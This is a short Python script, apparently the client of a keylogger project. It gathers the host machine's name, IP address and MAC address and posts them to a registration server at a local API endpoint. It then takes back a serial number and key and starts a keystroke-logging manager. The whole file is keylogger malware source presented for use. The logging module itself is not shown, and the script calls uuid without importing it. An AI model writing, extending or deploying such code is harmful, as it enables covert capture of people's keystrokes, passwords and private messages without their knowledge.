import manager as keylogger
import requests,socket

url = 'http://127.0.0.1:9734/api/create_machine'


def create_logger():
    hostname = socket.gethostname()
    ipaddress = socket.gethostbyname(hostname)
    mac_address = hex(uuid.getnode())
    data = {
        "host name": hostname,
        "ip": ipaddress,
        "mac address": mac_address
    }
    try:
        response = requests.post(url, json=data)
        response_dict = response.json()
        number = response_dict['serial_number']
        key = response_dict['key']
        key_logger = keylogger.KeyLoggerManager(number,key)
        key_logger.start_logging()
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False


if __name__ == "__main__":
    create_logger()
    # key_logger = keylogger.KeyLoggerManager(123)
    # key_logger.start_logging()
